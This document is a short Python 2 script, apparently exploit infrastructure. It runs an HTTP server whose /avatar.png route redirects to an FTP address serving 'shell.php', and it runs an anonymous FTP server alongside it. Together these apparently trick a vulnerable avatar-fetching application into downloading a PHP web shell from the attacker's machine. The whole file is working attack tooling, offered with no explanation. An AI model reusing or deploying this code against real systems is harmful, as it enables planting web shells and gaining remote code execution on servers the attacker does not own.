#!/usr/bin/env python2
import logging
import multiprocessing
import os
import time

your_ip = os.getenv('YOUR_IP', '127.0.0.1')

def bottle_http_server():
    import bottle

    app = bottle.Bottle()

    @app.get('/avatar.png')
    def avatar():
        bottle.redirect('ftp://%s:8081/shell.php' % your_ip)

    logger = logging.getLogger('waitress')
    logger.setLevel(logging.INFO)
    app.run(server='waitress', host=your_ip, port='8080')

def pyftpdlib_ftp_server():
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib.servers import FTPServer

    auth = DummyAuthorizer()
    auth.add_anonymous('.')

    class MyFTPHandler(FTPHandler):
        authorizer = auth

    server = FTPServer((your_ip, 8081), MyFTPHandler)
    server.serve_forever()

bottle_process = multiprocessing.Process(target=bottle_http_server)
ftp_process = multiprocessing.Process(target=pyftpdlib_ftp_server)

bottle_process.start()
ftp_process.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    bottle_process.terminate()
    ftp_process.terminate()
    print('Bye~')
